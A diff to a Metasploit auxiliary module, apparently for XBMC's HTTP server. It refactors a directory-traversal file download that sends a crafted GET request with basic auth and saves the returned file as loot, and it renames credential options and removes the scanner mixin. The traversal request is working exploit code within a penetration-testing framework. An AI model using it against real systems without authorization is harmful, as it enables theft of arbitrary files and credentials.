@@ -11,7 +11,6 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Auxiliary::Report
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Scanner
 
 	def initialize(info={})
 		super(update_info(info,
@@ -46,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
-	def run_host(ip)
+	def run
 		# No point to continue if no filename is specified
 		if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
 			print_error("Please supply the name of the file you want to download")
@@ -58,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		res = send_request_raw({
 			'method' => 'GET',
 			'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
-			'basic_auth' => "#{datastore['USER']}:#{datastore['PASS']}"
+			'basic_auth' => "#{datastore['USERNAME']}:#{datastore['PASSWORD']}"
 		}, 25)
 
 		# Show data if needed
@@ -70,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 				path = store_loot(
 					'xbmc.http',
 					'application/octet-stream',
-					ip,
+					datastore['RHOST'],
 					res.body,
 					fname
 				)
